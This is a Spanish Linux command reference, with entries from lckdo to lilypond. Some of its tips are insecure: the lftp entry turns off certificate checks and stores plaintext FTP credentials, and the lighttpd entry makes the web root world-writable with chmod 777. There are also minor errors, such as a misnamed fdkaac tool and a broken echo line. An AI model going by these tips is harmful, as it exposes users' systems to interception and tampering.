$ cfftot1 -o MyFont.pfa MyFont.otf (extrae la fuente CFF de `MyFont.otf` y la guarda como MyFont.pfa, ASCII Type 1)
$ mmafm -w 500 -o MyFontMM-500.afm MyFontMM.pfb (genera un archivo AFM para la instancia de peso 500 de la fuente Multimaster MyFontMM.pfb)
$ mmpfb -w 700 -o MyFont-Bold.pfb MyFontMM.pfb (genera una instancia en negrita, peso 700 y la guarda como MyFont-Bold.pfb)
$ otfinfo -i MyFont.otf (información general: nombre, copyright, etc)
$ otfinfo -t MyFont.otf (lista de tablas OpenType)
$ otfinfo -g MyFont.otf (lista de glifos)
$ otfinfo --script=latn MyFont.otf (muestra scripts soportados)
$ otfinfo -f MyFont.otf  (muestra características tipográficas)
$ otftotfm -a -e ec MyFont.otf MyFontEC (genera archivos TFM y mapas para usar MyFont.otf con codificación ec [European Computer Modern] en LaTeX)
$ otftotfm --automatic --vendor myfonts --typeface MyFont MyFont.otf MyFont (generar entradas para updmap)
$ t1dotlessj < MyFont.pfa > MyFont-dotlessj.pfa (crea una versión de la fuente sin punto en la "j")
$ t1lint MyFont.pfa (reporta errores o advertencias en la estructura de la fuente)
$ t1rawafm MyFont.pfb > MyFont.raw.afm (extrae métricas sin procesar de fuentes Type 1)
$ t1reencode ISOLatin1Encoding < MyFont.pfa > MyFont-iso.pfa (cambia la codificación de los glifos en una fuente Type 1, de StandardEncoding a ISOLatin1Encoding)
$ t1testpage MyFont.pfa > test.ps (genera un archivo PostScript que muestra todos los glifos de la fuente)
$ ttftotype42 MyFont.ttf > MyFont.t42 (envuelve una fuente TrueType (.ttf) en un contenedor PostScript Type 42, para usarla en entornos PostScript o PDF)


lckdo
[moreutils]. Bloquea la ejecución de un programa con el fin de evitar que otros procesos se ejecuten en paralelo. Se utiliza como nice [ver] y nohup [ver]


ld-linux
Libreria que permite ejecutar binarios del sistema sin permiso de ejecución siempre que tengan activado el permiso de lectura. Según se trate de 32 bits o 64, la libreria será: /lib/ld-linux.so.2 o /lib64/ld-linux-x86-64.so.2. Solo funciona con binarios no con scripts.
	# chmod -x /bin/ls
	# ls
	bash: /bin/ls: permiso denegado
	# /lib64/ld-linux-x86-64.so.2 /bin/ls
	a.jpg  b.jpg  captures  guia-sed.pdf ...


ldconfig
Se utiliza para crear, actualizar y eliminar enlaces simbólicos para las bibliotecas compartidas actuales basándose en los directorios de bibliotecas presentes en el directorio /etc/ld.so.conf
# ldconfig -p (Cantidad de directorios y bibliotecas que están almacenadas en la cache /etc/ld.so.cache y los enumera a continuación)
# ldconfig -v (Escanea todos los directorios e imprime el nombre del directorio y todos los enlaces que se crean bajo él)


ldd
Para conocer las librerias compartidas que usa una aplicación.
$ ldd /usr/bin/amarok


ldirectord
Utilizado para monitorizar la salud y el estado de los servidores reales que están detrás de los servicios virtuales proporcionados por LVS [Linux Virtual Server]. LVS es una solución de balanceo de carga que distribuye las solicitudes de red entre múltiples servidores para mejorar la escalabilidad y la disponibilidad de los servicios.
Configuración Básica:
# nano /etc/ha.d/ldirectord.cf
        checktimeout=10
        checkinterval=2
        autoservice=yes
        quiescent=yes
        #
        virtual=192.168.1.100:80
                real=192.168.1.101:80 gate
                real=192.168.1.102:80 gate
                service=http
                request="index.html"
                receive="Perfecto"
                scheduler=wlc
                protocol=tcp
                checktype=connect
checktimeout: Tiempo máximo en segundos para esperar una respuesta de un servidor real.
checkinterval: Intervalos en segundos entre comprobaciones de salud.
autoservice: Indica si ldirectord debe gestionar automáticamente los servicios virtuales.
quiescent: Indica si ldirectord debe poner en modo quiescente [inactivo] los servidores reales que fallen.
virtual: Define la dirección IP y el puerto del servicio virtual.
real: Define las direcciones IP y los puertos de los servidores reales.
service: Tipo de servicio a monitorizar, por ejemplo, http, tcp.
request: Petición específica a realizar para comprobar la salud del servicio.
receive: Respuesta esperada para considerar el servicio como saludable.
scheduler: Algoritmo de programación para distribuir las solicitudes, por ejemplo, wlc para Weighted Least Connections.
protocol: Protocolo utilizado para las comprobaciones.
checktype: Tipo de comprobación a realizar, por ejemplo, connect para comprobar la conectividad.
# systemctl enable ldirectord (habilitar el inicio automático)


ldkaac
interfaz de codificación AAC [Advanced Audio Codec] basado en la biblioteca libfdk-aac que lee audio PCM lineal en formato WAV, PCM sin procesar o CAF y lo codifica en archivos M4A/AAC"
Interfaz de codificación de línea de comandos para libfdk-aac. fdkaac es un codificador AAC de línea de comandos basado en libfdk-aac. Lee audio PCM lineal en formato WAV, PCM sin procesar o CAF y lo codifica en archivos M4A/AAC.
$ ldkaac input.wav -o output.m4a (tomará el archivo input.wav y lo codificará en formato AAC dentro de un contenedor M4A)
$ ldkaac input.wav -o output.m4a --bitrate 128 (generará un archivo con una calidad de tasa de bits constante de 128 kbps)
$ ldkaac input.wav -o output.m4a --quality 5 (obtener mejor eficiencia [de 1 a 5], con VBR [Variable Bitrate] en lugar de una tasa fija)
$ ldkaac input.pcm -o output.m4a --raw --raw-channels 2 --raw-rate 44100 --raw-format S16LE (archivo es PCM sin cabecera, audio es estéreo, frecuencia de muestreo a 44.1 kHz y formato formato Little Endian de 16 bits)
$ ldkaac input.wav -o output.m4a --rate 48000 (forzar la salida a 48 kHz)
$ ldkaac input.wav -o output.m4a --aaclc (usará el perfil AAC-LC [Low Complexity], compatible con la mayoría de los dispositivos)
$ ldkaac input.wav -o output.m4a --he (usar AAC-HE [High Efficiency], que es más eficiente a tasas de bits bajas)
$ ldkaac input.wav -o output.m4a --hev2 (optimizado para tasas de bits aún más bajas)


ldmtool
Herramienta para administrar discos dinámicos de Microsoft Windows que utilizan metadatos LDM [Logical Disk Manager] de Microsoft que permite detectar, mostrar e interactuar con ellos. Linux no soporta directamente estos discos dinámicos pero ldmtool actúa como una forma de leerlos y, en algunos casos, montar las particiones para poder acceder a los datos.
# ldmtool create all (escanea todos los discos conectados y crea representaciones de los volúmenes dinámicos que detecta)
# ldmtool show volumes (muestra una lista de todos los volúmenes lógicos detectados, incluyendo su tipo y nombre)
# ldmtool show partitions (muestra particiones que han sido reconocidas por ldmtool, listas para ser montadas)
# ldmtool show disks (ver qué discos físicos contienen los volúmenes LDM)
1.-
Un ejemplo para montar una partición detectada, suponiendo que "ldmtool show partitions" devuelva algo como:
        /dev/mapper/ldm_vol_Group_Volume1
Para montarlo:
# mkdir /mnt/windows-dynamic
# mount /dev/mapper/ldm_vol_Group_Volume1 /mnt/windows-dynamic
# ldmtool remove all (al terminar, limpia configuraciones de los volúmenes detectados para evitar conflictos posteriores)
Notas.- No es 100% confiable con configuraciones complejas como RAID dinámico o volúmenes dañados, en algunos casos es de solo lectura pero es ideal para recuperación de datos.


le
Editor de texto. Ctrol-x para salir
$ le file.txt


leafnode
Servidor de noticias [NNTP] ideal para sitios pequeños con ancho de banda limitado y pocos usuarios [leaf sites]). Ha sido diseñado para no requerir mantenimiento y ser fácil de configurar.
Ejemplo de configuración básica
        # nano /etc/leafnode/config
        # Servidor NNTP upstream (ej: usenet.proveedor.com)
        server = news.provider.com
        #
        # Grupos a suscribir
        groups = comp.os.linux,alt.www
        #
        # Directorio donde almacenar los artículos
        spooldir = /var/spool/news
# leafnode -f (sincronización con el servidor upstream y descargar nuevos artículos)
# leafnode -l (listar grupos disponibles)
# leafnode -a alt.new.group (suscribirse a un nuevo grupo)


leafpad
Editor tipo gedit.
Configuración de parámetros:
$ nano .config/leafpad/leafpadrc
	0.8.18.1
	1215 (Ancho)
	363 (Alto)
	Monospace 12 (Fuente y medida)
	1 (Ajustar / desajustar lineas al ancho de la ventana [0 o 1])
	0 (Mostrar / esconder número de linea [0 o 1])
	0
Atajos:
	Ctrl-n (Documento nuevo)
	Ctrl-o (Abrir)
	Ctrl-s (Guardar)
	Shift-Ctrl-s (Guardar como)
	Ctrl-w (Cerrar documento)
	Ctrl-p (Imprimir)
	Ctrl-q (Salir)
	Ctrl-z (Borrar última palabra escrita)
	Ctrl-y (Deshacer "borrar última palabra")
	Ctrl-x (Cortar)
	Ctrl-c (Copiar)
	Ctrl-v (Pegar)
	Ctrl-a (Seleccionar todo el texto)
	Ctrl-f (Buscar en el texto)
	Ctrl-g [F3] (Siguiente busqueda)
	Shift-Ctrl-g [Shift-F3] (Busqueda anterior)
	Ctrl-h [Ctrl-R] (Reemplazar palabras del texto por otras)
	Ctrl-j (Saltar a la linea...)
	Ctrl-t (Siempre en primer plano)


leave
Herramienta que permite programar recordatorios para que el usuario se acuerde de irse a una hora específica. Recuerda 5 minutos y 1 minuto antes de la hora real, a la hora exacta y cada minuto a partir de entonces. Cuando se desconecta, leave sale justo antes de imprimir el siguiente mensaje. todas las horas se convierten a un reloj de 12 horas y se asume que corresponden a las próximas 12 horas. Si intenta configurar una alarma para una fecha posterior, se truncará a las próximas 12 horas.
$ leave 1530 (programar una hora [las 15 horas 30 minutos])
$ leave +0030 (recordatorio a los 30 minutos de la hora actual)


lecm
[Let's Encrypt Certificates Manager]. Utilidad para gestionar certificados SSL/TLS de Let's Encrypt en sistemas Linux que permite generar, renovar y administrar certificados de manera sencilla mediante una configuración en formato YAML.
Ejemplo básico de configuración en YAML
# nano /etc/lecm.conf
        defaults:
          email: admin@ejemplo.com
          agree_tos: true
          webroot: /var/www/html
        #
        certificates:
          - domain: ejemplo.com
            webroot: /var/www/ejemplo
          - domain: api.ejemplo.com
            webroot: /var/www/api
# lecm --generate (lee la configuración y genera los certificados definidos)
# lecm --renew (renueva todos los certificados que estén próximos a caducar)
# lecm --status (muestra el estado de los certificados gestionados)
# lecm --renew --domain ejemplo.com (renueva solo el certificado del dominio ejemplo.com)


ledger
Programa de contabilidad de partida doble que es la que en cada transacción afecta al menos a dos cuentas, una que recibe y otra que entrega. Su libro de cuentas se almacena en uno o más archivos de texto plano con un formato muy simple y legible, y Ledger se encarga de la tarea de cuadrar sus libros y generar informes.
Ejemplo a partir de un archivo:
$ nano cuentas.ledger
        ; ==============================
        ; Archivo de contabilidad personal
        ; Formato: ledger (https://ledger-cli.org)
        ; ==============================
        ;
        ; === BALANCE DE OBERTURA ===
        2025/01/01 Saldo inicial banco
          Activos:Banco                 2000.00 EUR
          Patrimonio:Inicial
        ;
        ; === ENERO 2025 ===
        2025/01/05 Sueldo enero
          Activos:Banco                 1200.00 EUR
          Ingresos:Sueldo
        ;
        2025/01/06 Compra super       ; Merdadona
          Gastos:Comida                   85.20 EUR
          Activos:Banco
        ;
        2025/01/10 Subscripción Internet
          Gastos:Internet                 29.99 EUR
          Activos:Banco
        ;
        ; === FEBRERO 2025 ===
        2025/02/03 Sueldo febrero
          Activos:Banco                 1200.00 EUR
          Ingresos:Sueldo
        ;
        2025/02/04 Compra libros      ; Nombre de la Rosa
          Gastos:Cultura                  35.00 EUR
          Activos:Banco
        ;
        2025/02/20 Cine con amigos    ; Casablanca
          Gastos:Ocio                     24.00 EUR
          Activos:Banco
        ;
        ; === MARZO 2025 ===
        2025/03/01 Alquiler
          Gastos:Alquiler                650.00 EUR
          Activos:Banco
Nota.- Las fechas van al principio en formato inglés: año/mes/dia, las líneas con sangría representan cuentas afectadas, solo se necesita especificar una cantidad, la otra la calcula automáticamente y los comentarios [;] solo constan en el archivo.
$ ledger -f cuentas.ledger bal (ver el balance general)
$ ledger -f cuentas.ledger register Gastos (ver solo el apartado Gastos)
$ ledger -f cuentas.ledger register Ingresos (ver los ingresos)
$ ledger -f cuentas.ledger bal Gastos (balance de gastos)
$ ledger -f cuentas.ledger stats (muestra estadísticas básicas)
$ ledger -f cuentas.ledger register ^Gastos --period "2025/02" (ver gastos de la fecha especificada)
$ ledger -f cuentas.ledger register ^Gastos --period "2025/02/04" (de un dia en concreto)
$ ledger -f cuentas.ledger cleared (informe de saldo especial que añade dos columnas adicionales)


lemonbar
Es una barra ligera basada en XCB. Ofrece cambio de color de primer plano/fondo, alineación de texto y subrayado/superposición de color, compatibilidad total con UTF-8 y consumo de memoria reducido.
$ lemonbar -g 180x30 -B#ff0000 -F#42c24a (con la medida de la barra, color de fondo y color del texto especificados)
$ lemonbar -g 250x30+500+0 -b -B#ff5733 -F#1d610a (la barra a 500 del lateral tocando la parte baja y en la parte baja del monitor)
$ echo "Linux es un sistema genial | lemonbar -p (se muestra mientras no se cierre la terminal o Ctrl -c)
$ uname -a | lemonbar -p


less
Pagina la visualización de un fichero.
$ cat /etc/apt/sources.list | less
$ less fichero
Atajos:
	espacio (Avanzar un número de líneas igual al número de líneas de la pantalla)
	enter (Avanzar de línea en línea)
	y (Retroceder una línea)
	G (Ir al final del texto)
	g (Ir al inicio del texto)
	/ (Ingresar palabra a ser buscada de la página actual al final del texto)
	? (Ingresar palabra a ser buscada de la página actual al inicio del texto)
	n (Ir a la siguiente coincidencia de búsqueda)
	AvPág (Avanzar una pantalla de texto)
	RePág (Retroceder una pantalla de texto)
	v (Abrir lo que se visualiza con el editor. Por defecto vi)
	h (Ayuda)
	q (Salir del programa)


lessfile
Programa que modifica la forma en que se muestra los contenidos de un archivo el comando less, lo que significa es que less podrá abrir automáticamente archivos tar, tar.bz2, gzip, bz, 7z, pdf, jar, deb, iso e incluso mostrar características básicas de archivos gráficos tipo .gif, .png, .jpg, .tif, etc.  Colocar en ~/.bashrc una de las siguientes lineas:
    eval "$(lessfile)"
    eval "$(lesspipe)"
Actualizar el archivo:
    $ source ./.bashrc
Antes de actualizar .bashrc si se lanza.
$ less archivo.rar (mostrará caracteres raros)
Después de actualizar .bashrc mostrará el contenido del archivo.


lesspipe
Exactamente igual que lessfile [ver]


let
Permite asignar el resultado de una expresión aritmética a una variable.
$ let a=4*3; echo $a
Ejemplo en un script:
	#!/bin/bash
	read -p "Dime dos número del 1 al 100: " NUM1 NUM2
	let SUMA=$NUM1+$NUM2
	echo "La suma de $NUM1 + $NUM2 es $SUMA"
let permite utilizar asignaciones:
	incremento +=
	decremento -=
	mutiplicar por *=
	dividir por /=
	modulo por %=
	incremento en 1 ++
	decremento en 1 --
Ejemplo:
	#!/bin/bash
	let x=1
	let x+=1
	echo $x


lf
lf ("list files") es un administrador de archivos escrito en Go. Está inspirado en gran medida por ranger [ver] con algunas características extra y algunas que faltan. Puede encontrarse en <https://github.com/gokcehan/lf>


lfm
Administrador de archivos
$ lfm -1 (arrancar con un solo panel)
$ lfm -2 (arrancar con dos [por defecto])
$ lfm /home/usuario/Documentos /media/sda2 (Abrir en cada panel un directorio)
Nota.- Pulsar “q” para cerrar


lft
[Layer Four Traceroute]. Herramienta avanzada de diagnóstico de red que realiza un trazado de ruta utilizando paquetes TCP en lugar del método tradicional basado en UDP o ICMP. Útil para analizar rutas de red en entornos donde los paquetes UDP o ICMP podrían estar bloqueados por firewalls. `lft` envía sondas TCP SYN o FIN, manipulando el campo TTL (Time To Live) del protocolo IP, y espera respuestas ICMP TIME_EXCEEDED de los routers intermedios para mapear la ruta hacia el host de destino.
$ lft -d 80 google.com (trazar la ruta a un host usando el puerto 80)
$ lft -F google.com (enviar sondas TCP FIN útil en algunos firewalls que filtran SYN)
$ lft -a google.com (ver solo direcciones IP sin consultas DNS)
$ lft -v -d 80 google.com (obtener más información sobre los paquetes enviados y recibidos)
$ lft -m 10 google.com (restringir el trazado a un número máximo de saltos)


lftp
Conexión ftp por linea de comandos.
$ lftp usuario@host
# lftp -help  (Para obtener ayuda)
# lftp -u usuario,clave ftp.dominio.com (Conectar con un servidor de FTP)
Nota.- entrados en el directorio raiz del servidor ftp remoto el prompt adquiere un estilo:
# lftp usuario@ftp.dominio.com:~>
Algunas de las opciones que tenemos en el host remoto son las mismas que podemos emplear en bash:
	mkdir, mv, ls, rm, exit, cat, more, chmod, pwd...
Algunas opciones específicas:
~> get archivo (Bajar un archivo del remoto al local)
~> mget dir (Bajar un directorio del remoto al local)
~> put archivo  (Subir un archivo del local al remoto)
~> mput dir (Subir un directorio del local al remoto)
~> mirror dir  (copiará el contenido de htdocs (remoto) a la carpeta donde estemos en local.
~> help mirror (opciones de mirror)
~> exit   (salir del remoto)
~> !ls (listará el directorio local)
~> !mkdir dir (crear un directorio en local)
~> !pwd (En què directorio nos encontramos en local)
1.-
Resolver la nota "Fatal error: Certificate verification: Not trusted" que informa que el cliente no puede verificar la autenticidad del certificado que esta ofreciendo el servidor. Se ignora el error con:
	set ssl:verify-certificate no
Para no tener que colocar la linea cada vez que nos conectamos, podemnos crear el archivo ./lftp/rc i colocarla en él.
2.-
Para no entrar cada vez nombre de usuario ni contraseña y además tener un alias para la conexión [servidor], podemos crear el archivo ./lftp/bookmarks y colocar la linea:
	servidor	ftp://USER:PASS@HOST
La conexión se realizarà con:
$ lftp servidor


lha
Compresor/descompresor de archivos.
$ lha -a archivo.lha ficheros (Comprimir)
$ lha -x archivo.lha (Descompimir)
$ lha -v archivo.lha (Ver el contenido)


lhasa
Herramienta para descomprimir archivos LHA [.lzh] de Unix que no es libre. El objetivo es ser compatible con el mayor número posible de variantes del formato de archivo LHA, incluyendo LArc [.lzs] y PMarc [.pma]. No permite comprimir.
$ lhasa l archivo.lzh (ver los archivos dentro de un archivo .lzh sin extraerlos)
$ lhasa x mi_archivo_antiguo.lzh (descomprimir todos los archivos contenidos en un .lzh en el directorio actual)
$ lhasa x mi_archivo_antiguo.lzh documento.txt (extraer un archivo específico)


libaa-bin
Biblioteca de gráficos artísticos ASCII. Comprende los ejecutables: aafire [ver], aainfo, aasavefont y aatest
$ aainfo
$ aatest


libaio
[LIBrary Asynchronous I/O]. Biblioteca en sistemas Linux de alto rendimiento, especialmente en entornos de bases de datos y aplicaciones que manejan una gran cantidad de operaciones de entrada/salida [I/O] de disco. Para usar libaio, un programa debe incluir el archivo de cabecera libaio.h y usar las funciones provistas por la biblioteca, como: io_setup(), io_submit(), io_getevents() o io_destroy().


libcap-ng-utils
Este paquete contiene utilidades para analizar y configurar las capacidades de los archivos. Incluye las aplicaciones: captest, filecap, netcap  y pscap [imprimen un informe de las capacidades del proceso]
# netcap
# pscap
# captest
# filecap


libmemcached-tools
Conjunto de utilidades para interactuar y administrar servidores Memcached. Este toolkit está diseñado para ser eficiente en uso de memoria, seguro para subprocesos y ofrecer acceso completo a los métodos del servidor. Este paquete proporciona varias herramientas de línea de comandos: memcaslap, memccapable, memccat, memccp, memcdump, memcerror, memcexist, memcflush, memcparse, memcping, memcrm, memcslap, memcstat y memctouch.
$ memccp --servers localhost archivo.txt (guarda el contenido de archivo.txt en Memcached y el nombre del archivo es la clave "archivo.txt")
$ memccat --servers localhost archivo.txt (recupera y muestra el contenido de la clave archivo.txt desde Memcached)
$ memcdump --servers localhost (listar todas las claves existentes en el servidor Memcached)
$ memcrm --servers localhost archivo.txt (borra la clave archivo.txt de Memcached)
$ memcflush --servers localhost (vacía todo el almacenamiento de Memcached, elimina todas las claves)
$ memcstat --servers localhost (muestra estadísticas del servidor)
$ memaslap -s 127.0.0.1:11211 -S 5s (realiza tests de rendimiento por 5 segundos con valores por defecto: 16 concurrencias, 1 hilo, operación get/set 9:1, etc.)
$ memaslap -s 127.0.0.1:11211 -t 2m -v 0.2 -e 0.05 (ejecuta pruebas durante 2 minutos, con 20% de verificación de datos y 5% de registros con experación)
$ memcexist --servers localhost clave1 clave2` (informa si las claves existen)
$ memcping --servers localhost (equivalente a "ping" de red para servidores Memcached)
$ memctouch --servers localhost -e 120 clave (cambia o renueva el tiempo de expiración de una clave)
Nota.- Por defecto el puerto es el 11211.


libnetcfg
Libnet es una API que ayuda con la construcción e inyección de paquetes de red de bajo nivel. La utilidad libnetcfg se puede utilizar para configurar libnet.
$ libnetcfg


libpam-tmpdir
Muchos programas usan $TMPDIR para almacenar archivos temporales. No todos son buenos para asegurar los permisos de esos archivos. libpam-tmpdir establece $TMPDIR y $TMP para sesiones PAM y establece los permisos bastante estrictos. Esto ayuda a la seguridad del sistema al tener una capa adicional de seguridad, lo que hace que tales ataques de enlaces simbólicos y otros ataques basados en tmp sean más difíciles o imposibles. El módulo pam_tmpdir, invoca pam-tmpdir-helper para crear un directorio temporal seguro para el usuario que lo invoca. No es dañino llamarlo a mano, pero no dará ningún diagnóstico ni mensaje de error aparte de su valor de retorno. Se registra en syslog.
$ pam-tmpdir-helper


libreoffice
[myspell-ca myspell-es]
Suite ofimática. Ver lo..
1.-
Cambiar de pantalla de inicio
$ wget http://gnome-look.org/CONTENT/content-files/140076-libreoffice_splash.tar.gz
$ tar -zxvf 140076-libreoffice_splash.tar.gz
# cp about.png intro.png /usr/lib/libreoffice/program/
En el archivo readme.txt se especifica el último paso:
Modificar el archivo /etc/libreoffice/sofficerc con siguientes parámatros:
	[Bootstrap]
	HideEula=1
	Logo=1
	NativeProgress=true
	ProgressBarColor=78,158,1
	ProgressFrameColor=45,45,45
	ProgressPosition=60,277
	ProgressSize=320,6
Atajos (write)
	Ctrl+Inicio (Ir al inicio del documento)
	Crtl+Fin Ir al final del documento)
	Ctrl+u (Subrayado)
	Ctrl+i (cursiva)
	Ctrl+b (negrita)
	Ctrl+e (texto centrado)
	Ctrl+l	 (texto alineado a la izquierda)
	Ctrl+m (Formateado de fuente por defecto)
	Ctrl+a (seleccionar todo el texto)
	Ctrl+s (Guardar documento)
	F7 (Ortografia y gramatica)


libwacom-list-local-devices
Utilidad para listar los dispositivos conectados e identificados por libwacom. libwacom es una biblioteca para identificar tabletas gráficas las características específicas de cada modelo. Facilita el acceso a información como si es una tableta integrada en la pantalla, cuál es el tamaño de este modelo, etc. Originalmente estaba diseñado sólo para dispositivos Wacom pero ahora soporta cualquier tableta gráfica de cualquier proveedor. . Normalmente se utiliza para comprobar si un archivo de datos libwacom  es correcto, está presente y/o se aplica a un dispositivo específico.
$ libwacom-list-local-devices


liece
Cliente IRC [Internet Relay Chat] para Emacs basado en Irchat aunque no tiene nada que ver son este. "M-x liece" abrirá la interfaz de Liece dentro de Emacs, desde donde se puede conectar a servidores IRC, por ejemplo irc.libera.chat, y unirse a canales, por ejemplo #emacs y, con el apodo chhatear.


lifelines
Programa de genealogía que permite a los usuarios mantener registros genealógicos y generar informes a partir de ellos. Proporcionar una interfaz de usuario basada en pantalla y menú y mantiene registros genealógicos [personas, familias, fuentes, eventos y otros] en una base de datos y genera informes a partir de ellos. Incluye varios ejecutables: btedit, dbverify, llexec y llines.
$ btedit mi_arbol.ged (abrirá el archivo mi_arbol.ged)
$ dbverify mi_arbol.ged (verificar la integridad del archivo mi_arbol.ged y reportará cualquier error encontrado)
$ llexec mi_script.ll mi_arbol.ged (ejecutará el script mi_script.ll en la base de datos mi_arbol.ged)
$ llines mi_arbol.ged (abrirá la interfaz de usuario de Lifelines para el archivo mi_arbol.ged)
Los datos genealógicos en Lifelines se introducen y almacenan en archivos con formato GEDCOM [.ged]. Un ejemplo de cómo se puede ver un archivo:
$ nano mi_arbol.ged
        0 HEAD
        1 SOUR LIFELINES
        2 VERS 3.0.5
        1 DEST LIFELINES
        1 DATE 14 JUL 2025
        1 SUBM @SUBM@
        1 FILE mi_arbol.ged
        1 GEDC
        2 VERS 5.5
        2 FORM LINEAGE-LINKED
        1 CHAR UTF-8
        0 @SUBM@ SUBM
        1 NAME Juan Pérez
        0 @I1@ INDI
        1 NAME Juan /Pérez/
        1 SEX M
        1 BIRT
        2 DATE 1 JAN 1950
        1 FAMS @F1@
        0 @I2@ INDI
        1 NAME María /Gómez/
        1 SEX F
        1 BIRT
        2 DATE 1 JAN 1955
        1 FAMS @F1@
        0 @F1@ FAM
        1 HUSB @I1@
        1 WIFE @I2@
        1 CHIL @I3@
        0 @I3@ INDI
        1 NAME Luis /Pérez Gómez/
        1 SEX M
        1 BIRT
        2 DATE 1 JAN 1980
        1 FAMC @F1@
        0 TRAILER
Un ejemplo de Script de Lifelines que genera un informe de todas las personas en la base de datos:
$ nano mi_script.ll
        proc main() {
            forindilist(person, indiset()) {
                name(person, "PNV")
                printf("\n")
            }
        }


liferea
Lector RSS.
Atajos:
	Ctrl + u (Actualizar todos los feeds)
	Ctrl + r (Marcar feed como leído)
	Ctrl + n (Ir al siguiente feed no leído)
	u (Subir por los feeds)
	d (Bajar por los feeds)
	b (Moverse del feed a la noticias)
	f (Bajar por las noticias)
	Espacio (Abrir la noticia en el navegador)


lightdm
Gestor de sesiones.
1.-
Suprimir la cuenta de invitado:
# nano /etc/lightdm/lightdm.conf
Añadir la linea:
allow-guest=false
# restart lightdm (Reiniciar servicio)
2.-
Entrar de forma automática:
 - Para versiones modernas:
Crear fichero /etc/lightdm/lightdm.conf.d/12-autologin.conf
# nano /etc/lightdm/lightdm.conf.d/12-autologin.conf
Insertar estas 3 líneas editando USUARIO por tu usuario:
[Seat:*]
autologin-user=USUARIO
autologin-user-timeout=0
 - En versiones antiguas
# nano /etc/lightdm/lightdm.conf
autologin-user=USUARIO
autologin-user-timeout=0
3.-
Para modificar la sesión por defecto:
# nano /usr/share/xsessions/lightdm-xsession.desktop
Y colocar en la linea Exec el deseado:
	[Desktop Entry]
	Version=1.0
	Name=Default Xsession
	Exec=mate-session
	Icon=
	Type=Application


light-locker-command
Protector de pantalla.
$ light-locker-command -t 3 (que se ejecute a los 3 minutos)
$ light-locker-command -l (imediatamente)
$ light-locker-command -d (desactivarlo)


lighter
Herramienta de bioinformática diseñada para la corrección de errores en datos de secuenciación de ADN y ARN. La mayoría de las herramientas de corrección de errores se basan en el conteo de k-meros [subcadenas de longitud $k$ que se encuentran en las lecturas de secuenciación]. Los k-meros que aparecen con alta frecuencia se consideran "correctos", mientras que los que aparecen con baja frecuencia se consideran "errores".
$ lighter -r my_reads.fastq -o corrected_reads -k 31 -t 8 (lecturas de entrada en formato FASTQ, salida corregida, longitud k-mer a utilizar [31] y 8 hilos de procesamiento)
$ lighter -r forward_reads.fastq,reverse_reads.fastq -o corrected_paired_reads -k 27 -max_mem 10G (con 2 lecturas de pares apareados [paired-end] y cantidad máxima de memoria RAM a 10 Gigabytes)
$ lighter -r reads.fastq -o final_corrected_reads -k 21 -s 0.05 -f (-s 0.05 indica usar el 5% de las lecturas para construir el filtro Bloom de k-meros de entrada [predeterminado 1%] y -f que los archivos corregidos esten en formato fasta en lugar de fastq)


lighttpd
Servidor web pequeño, rápido y un consumo de memoria mínimo, desarrollado pensando en la seguridad y con numerosas funciones.
$ lighttpd -t -f /etc/lighttpd/lighttpd.conf (encontrar errores en la configuración)
# /etc/init.d/lighttpd start
# chmod 777 -R /var/www/html
$ a2enmod php8.2 (activar php en localhost)
# echo '<?php phpinfo();?>' >> /var/www/html/index.php
Con el navegador acceder a la página http://localhost


likwid
Conjunto de herramientas de línea de comandos orientados al rendimiento. Funciona con procesadores Intel y AMD
$ likwid-topology (imprime la topología de subprocesos y caché)
$ likwid-features -a (funciones disponibles. Las características modificables están marcadas con *)
$ likwid-features -l (imprimir el estado de todas las funciones para las CPU)
$ likwid-features -e HW_PREFETCHER,CL_PREFETCHER (especificar qué características debe habilitarse)
$ likwid-features -d DCU_PREFETCHER,IP_PREFETCHER (deshabilitar caacteriístics)
$ likwid-perfctr -a (muestra los contadores de rendimiento de hardware)
$ likwid-perfctr -e (imprime los contadores disponibles y los eventos de rendimiento del procesador actual y, si están disponibles, las GPU Nvidia)
$ likwid-powermeter (información de energía RAPL e información sobre los pasos del modo Turbo)
$ likwid-setFrequencies -p (imprimir frecuencias actuales si estan disponibles)
$ likwid-setFrequencies -l (listar frecuencias de CPU disponibles)
$ likwid-setFrequencies -t 1 (activar modo turbo si disponible. "-t 0" para desactivar)
$ likwid-memsweeper (limpia los dominios de memoria NUMA llenos y elimina la línea de caché sucia de la jerarquía de caché)
$ likwid-genTopoCfg (vuelca la información de topología al archivo /usr/etc/likwid_topo.cfg si existe)
$ likwid-perfscope -a (imprimir las configuraciones preconfiguradas para el sistema actual)
$ likwid-pin -p (dominios disponibles con mapeo en identificaciones físicas)
$ likwid-perfscope -a (imprimir todas las configuraciones de trazado preconfiguradas para el sistema actual)


lilo
Gestor de arranque. La configuración en:
# nano /etc/lilo.conf
Algunos parametros a especificar:
# Indica que se instale en determinado disco:
boot = /dev/sda
# El sistema que arrancará por defecto [el especificado en la etiqueta [label]]
default = Linux
# Que muestre cualquier cosa que sea referenciado en la línea message:
prompt
# Una imagen. Medidas 640x480:
bitmap = /boot/slack.bmp
# un mensaje de inicio:
message = /boot/boot_message.txt
# tiempo de espera para arrancar la partición por defecto [en segundos]:
timeout = 50
# Una partición linux
image = /boot/vmlinuz
	root = /dev/sda2
	label = Linux
	read only
# nota: read-only Indica que el sistema de ficheros raíz se montará en modo solo-lectura.
# Por norma general, el proceso de arranque lo remonta luego en modo lectura-escritura.
# Una partición windows:
other = /dev/hda1
    label = Windows
    table = /dev/sda1
Si queremos una contraseña para entrar en alguno de los sistemas colocamos en su entrada:
	password = 12345
Cualquier modificación en este archivo para guardar los cambios, implica lanzar:
# lilo


lilv-utils
Biblioteca de plugins LV2. Incluye las herramientas lilv-bench, lv2apply [aplica un plugin LV2 a un archivo de audio],
# lv2bench (realiza una evaluación comparativa de todos los plugins LV2 instalados y compatibles)
# lv2ls -n (lista todos los plugins LV2 instalados)
# lv2bench (listado de URIs [Uniform Resource Identifier])
# lv2info -p http://drobilla.net/plugins/fomp/triple_chorus (información sobre un plugin LV2 instalado)
# lv2info -m 0.003550 http://lsp-plug.in/plugins/lv2/slap_delay_stereo (añade el registro del complemento)


lilypond
Sistema de composición tipográfica musical y grabado automatizado. Produce partituras utilizando un archivo de descripción de alto nivel como entrada. LilyPond admite diversas formas de construcción de notación musical, incluyendo nombres de acordes, notación de batería, bajo cifrado, notas de adorno, tablatura de guitarra, trémolos, grupos irregulares y más. Ejemplos y extensa explicación en https://lilypond.org/examples.es.html y https://lilypond.org/manuals.es.html.
$ lilypond --loglevel=ERROR ejemplo.ly -o ejemplo (muestra errores por pantalla y si no existen, genera un archivo ejemplo.pdf con la partitura)
